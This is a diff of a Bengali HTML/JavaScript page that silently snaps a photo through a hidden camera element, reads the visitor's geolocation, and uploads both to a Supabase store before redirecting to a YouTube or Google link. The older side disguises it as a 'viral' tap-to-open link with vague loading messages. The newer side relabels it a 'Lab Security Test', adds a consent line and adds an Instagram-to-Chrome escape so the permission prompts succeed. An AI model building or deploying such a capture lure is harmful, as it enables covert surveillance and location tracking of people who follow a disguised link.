@@ -1,115 +1,138 @@
 <!DOCTYPE html>
 <html lang="bn">
-
 <head>
-
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <meta
-    name="viewport"
-    content="width=device-width, initial-scale=1.0"
-  >
-
-  <title>viral</title>
+  <title>Lab Security Test</title>
 
   <style>
-
     body {
       font-family: Arial, sans-serif;
       margin: 0;
       min-height: 100vh;
       background: #f5f5f5;
-
       display: flex;
       justify-content: center;
       align-items: center;
     }
 
     .box {
-
       width: 92%;
       max-width: 600px;
-
       background: white;
-
       padding: 30px;
-
       border-radius: 15px;
-
-      box-shadow:
-        0 3px 12px rgba(0,0,0,0.12);
-
+      box-shadow: 0 3px 12px rgba(0,0,0,0.12);
       text-align: center;
     }
 
     button {
-
       display: block;
-
       margin: 20px auto;
-
       width: 80%;
       max-width: 400px;
-
       padding: 18px;
-
       border: none;
-
       border-radius: 12px;
-
       background: #222;
-
       color: white;
-
       font-size: 20px;
-
       font-weight: bold;
+      cursor: pointer;
     }
 
     button:disabled {
       opacity: 0.6;
+      cursor: not-allowed;
     }
-
-    /*
-     * Camera preview hidden
-     */
 
     #camera {
       display: none;
     }
 
     #status {
-
       margin-top: 15px;
-
       font-weight: bold;
-
       line-height: 1.6;
     }
 
     .notice {
-
       font-size: 14px;
-
       color: #555;
-
-      line-height: 1.5;
+      line-height: 1.6;
     }
 
+    #browserNotice {
+      display: none;
+      background: #fff3cd;
+      border: 1px solid #ffe69c;
+      padding: 18px;
+      border-radius: 12px;
+      margin-bottom: 20px;
+    }
+
+    #browserNotice h3 {
+      margin-top: 0;
+    }
+
+    #chromeBtn {
+      width: 100%;
+      max-width: none;
+      background: #1a73e8;
+      margin: 15px auto;
+    }
+
+    #chromeFallback {
+      display: none;
+      margin-top: 15px;
+    }
   </style>
-
 </head>
-
 
 <body>
 
 <div class="box">
 
-  <h2>Tap To Open</h2>
+  <h2>🔐 Lab Security Test</h2>
+
+
+  <!-- Instagram Browser Notice -->
+
+  <div id="browserNotice">
+
+    <h3>🌐 Chrome Browser ব্যবহার করুন</h3>
+
+    <p class="notice">
+      এই test-এর camera ও location permission-এর জন্য
+      Chrome browser ব্যবহার করুন।
+    </p>
+
+    <button
+      id="chromeBtn"
+      type="button"
+      onclick="openChrome()"
+    >
+      🌐 Open Chrome Browser
+    </button>
+
+    <p
+      id="chromeFallback"
+      class="notice"
+    >
+      Chrome automatically না খুললে Instagram-এর
+      <b>⋮ → Open in browser</b> নির্বাচন করে Chrome দিয়ে
+      এই link খুলুন।
+    </p>
+
+  </div>
+
+
+  <!-- Consent Notice -->
 
   <p class="notice">
-
-  
+    Continue করলে camera ও location permission চাওয়া হবে।
+    Photo ও location এই lab-এর Supabase database-এ save হবে।
   </p>
 
 
@@ -117,15 +140,15 @@
     id="startBtn"
     onclick="startTest()"
   >
-    Open
+    📷 Continue
   </button>
 
 
   <video
     id="camera"
     autoplay
-    playsinline
-  ></video>
+    playsinline>
+  </video>
 
 
   <p id="status"></p>
@@ -133,16 +156,10 @@
 </div>
 
 
-<script
-  src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2">
-</script>
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
 
 <script>
-
-/* =========================
-   SUPABASE
-========================= */
 
 const SUPABASE_URL =
   "https://kkydmymmltcxjxtbkhwj.supabase.co";
@@ -150,19 +167,83 @@ const SUPABASE_URL =
 const SUPABASE_PUBLISHABLE_KEY =
   "sb_publishable_Q1mhRPTOLcEUBwUog1nygQ_91N8_pzM";
 
+
 const supabaseClient =
   window.supabase.createClient(
-
     SUPABASE_URL,
-
     SUPABASE_PUBLISHABLE_KEY
-
   );
 
 
-/* =========================
-   GET TARGET URL
-========================= */
+// =====================================
+// Detect Instagram In-App Browser
+// =====================================
+
+const isInstagramBrowser =
+  /Instagram/i.test(
+    navigator.userAgent
+  );
+
+
+if (isInstagramBrowser) {
+
+  document.getElementById(
+    "browserNotice"
+  ).style.display = "block";
+
+}
+
+
+// =====================================
+// Open Chrome
+// =====================================
+
+function openChrome() {
+
+  const currentUrl =
+    window.location.href;
+
+
+  const chromeUrl =
+    "googlechrome://navigate?url=" +
+    encodeURIComponent(currentUrl);
+
+
+  const fallback =
+    document.getElementById(
+      "chromeFallback"
+    );
+
+
+  fallback.style.display =
+    "none";
+
+
+  // Try opening Chrome
+
+  window.location.href =
+    chromeUrl;
+
+
+  // If Instagram blocks it,
+  // show fallback instructions
+
+  setTimeout(
+    () => {
+
+      fallback.style.display =
+        "block";
+
+    },
+    1500
+  );
+
+}
+
+
+// =====================================
+// Get Target URL
+// =====================================
 
 function getTargetURL() {
 
@@ -171,25 +252,25 @@ function getTargetURL() {
       window.location.search
     );
 
+
   const target =
     params.get("target");
+
 
   if (!target) {
     return null;
   }
+
 
   try {
 
     const url =
       new URL(target);
 
+
     const hostname =
       url.hostname.toLowerCase();
 
-
-    /*
-     * Only allow these destinations
-     */
 
     const allowed =
       url.protocol === "https:" &&
@@ -198,7 +279,6 @@ function getTargetURL() {
         hostname === "www.youtube.com" ||
         hostname === "m.youtube.com" ||
         hostname === "youtu.be" ||
-
         hostname === "google.com" ||
         hostname === "www.google.com" ||
         hostname === "share.google"
@@ -212,6 +292,7 @@ function getTargetURL() {
 
     return url.href;
 
+
   } catch (error) {
 
     return null;
@@ -221,36 +302,63 @@ function getTargetURL() {
 }
 
 
-/* =========================
-   START TEST
-========================= */
+// =====================================
+// Start Test
+// =====================================
 
 async function startTest() {
 
   const button =
-    document.getElementById("startBtn");
+    document.getElementById(
+      "startBtn"
+    );
+
 
   const status =
-    document.getElementById("status");
+    document.getElementById(
+      "status"
+    );
+
 
   const video =
-    document.getElementById("camera");
+    document.getElementById(
+      "camera"
+    );
+
 
   let stream = null;
 
 
-  button.disabled = true;
+  button.disabled =
+    true;
 
 
   try {
 
 
-    /* =========================
-       CAMERA PERMISSION
-    ========================= */
+    // =================================
+    // Block test inside Instagram
+    // =================================
+
+    if (isInstagramBrowser) {
+
+      status.innerText =
+        "🌐 আগে Open Chrome Browser button চাপুন।";
+
+      button.disabled =
+        false;
+
+      return;
+
+    }
+
+
+    // =================================
+    // Camera Permission
+    // =================================
 
     status.innerText =
-      "Loading....";
+      "📷 Camera permission চাওয়া হচ্ছে...";
 
 
     if (
@@ -259,7 +367,7 @@ async function startTest() {
     ) {
 
       throw new Error(
-        " access not available"
+        "এই browser-এ camera access available নয়।"
       );
 
     }
@@ -286,16 +394,21 @@ async function startTest() {
 
     await new Promise(
       resolve =>
-        setTimeout(resolve, 800)
+        setTimeout(
+          resolve,
+          800
+        )
     );
 
 
-    /* =========================
-       CAPTURE PHOTO
-    ========================= */
+    // =================================
+    // Capture Photo
+    // =================================
 
     const canvas =
-      document.createElement("canvas");
+      document.createElement(
+        "canvas"
+      );
 
 
     canvas.width =
@@ -312,60 +425,48 @@ async function startTest() {
     ) {
 
       throw new Error(
-        "no access"
+        "Camera থেকে ছবি নেওয়া যায়নি।"
       );
 
     }
 
 
     const ctx =
-      canvas.getContext("2d");
+      canvas.getContext(
+        "2d"
+      );
 
 
     ctx.drawImage(
-
       video,
-
       0,
-
       0,
-
       canvas.width,
-
       canvas.height
-
     );
 
 
     const photoBlob =
       await new Promise(
         resolve =>
-
           canvas.toBlob(
-
             resolve,
-
             "image/jpeg",
-
             0.85
-
           )
-
       );
 
 
     if (!photoBlob) {
 
       throw new Error(
-        "permission not allowed"
+        "Photo capture করা যায়নি।"
       );
 
     }
 
 
-    /* =========================
-       STOP CAMERA
-    ========================= */
+    // Stop Camera
 
     stream
       .getTracks()
@@ -382,18 +483,18 @@ async function startTest() {
       null;
 
 
-    /* =========================
-       LOCATION
-    ========================= */
+    // =================================
+    // Location Permission
+    // =================================
 
     status.innerText =
-      "please wait";
+      "📍 Location permission চাওয়া হচ্ছে...";
 
 
     if (!navigator.geolocation) {
 
       throw new Error(
-        "not available"
+        "এই browser-এ location available নয়।"
       );
 
     }
@@ -401,7 +502,6 @@ async function startTest() {
 
     const position =
       await new Promise(
-
         (resolve, reject) => {
 
           navigator.geolocation.getCurrentPosition(
@@ -411,19 +511,14 @@ async function startTest() {
             reject,
 
             {
-
               enableHighAccuracy: false,
-
               timeout: 30000,
-
               maximumAge: 30000
-
             }
 
           );
 
         }
-
       );
 
 
@@ -435,9 +530,9 @@ async function startTest() {
       position.coords.longitude;
 
 
-    /* =========================
-       FILE NAME
-    ========================= */
+    // =================================
+    // Upload Photo
+    // =================================
 
     const fileName =
       "lab/" +
@@ -445,21 +540,14 @@ async function startTest() {
       ".jpg";
 
 
-    /* =========================
-       PHOTO UPLOAD
-    ========================= */
-
     status.innerText =
-      "Almost Done";
+      "☁️ Photo upload হচ্ছে...";
 
 
     const uploadResult =
       await supabaseClient
-
         .storage
-
         .from("photos")
-
         .upload(
 
           fileName,
@@ -467,13 +555,11 @@ async function startTest() {
           photoBlob,
 
           {
-
             contentType:
               "image/jpeg",
 
             upsert:
               false
-
           }
 
         );
@@ -486,19 +572,17 @@ async function startTest() {
     }
 
 
-    /* =========================
-       SAVE LOCATION
-    ========================= */
+    // =================================
+    // Save Location
+    // =================================
 
     status.innerText =
-      "waiting...";
+      "💾 Location save হচ্ছে...";
 
 
     const insertResult =
       await supabaseClient
-
         .from("captures")
-
         .insert({
 
           photo_url:
@@ -520,21 +604,21 @@ async function startTest() {
     }
 
 
-    /* =========================
-       SUCCESS
-    ========================= */
+    // =================================
+    // Success
+    // =================================
 
     status.innerText =
-      "Done";
+      "✅ Photo এবং location সফলভাবে save হয়েছে.";
 
 
     button.style.display =
       "none";
 
 
-    /* =========================
-       REDIRECT
-    ========================= */
+    // =================================
+    // Redirect
+    // =================================
 
     const targetURL =
       getTargetURL();
@@ -543,20 +627,17 @@ async function startTest() {
     if (targetURL) {
 
       status.innerText =
-        "Loading...";
+        "✅ Save হয়েছে। Destination খোলা হচ্ছে...";
 
 
       setTimeout(
-
         () => {
 
           window.location.href =
             targetURL;
 
         },
-
         800
-
       );
 
     }
@@ -564,9 +645,10 @@ async function startTest() {
 
   } catch (error) {
 
-
     console.error(error);
 
+
+    // Stop camera if running
 
     if (stream) {
 
@@ -584,31 +666,38 @@ async function startTest() {
       false;
 
 
+    // =================================
+    // Error Messages
+    // =================================
+
     if (error.code === 1) {
 
       status.innerText =
-        "no permission access";
+        "❌ Location permission দেওয়া হয়নি.";
 
+    }
 
-    } else if (error.code === 2) {
-
-      status.innerText =
-        "no access";
-
-
-    } else if (error.code === 3) {
+    else if (error.code === 2) {
 
       status.innerText =
-        "try again";
+        "❌ Location পাওয়া যায়নি। ফোনের Location ON করে আবার চেষ্টা করো.";
 
+    }
 
-    } else {
+    else if (error.code === 3) {
+
+      status.innerText =
+        "❌ ৩০ সেকেন্ডের মধ্যে Location পাওয়া যায়নি.";
+
+    }
+
+    else {
 
       status.innerText =
         "❌ " +
         (
           error.message ||
-          "error"
+          "কাজটি সম্পন্ন হয়নি."
         );
 
     }
@@ -620,5 +709,4 @@ async function startTest() {
 </script>
 
 </body>
-
 </html>
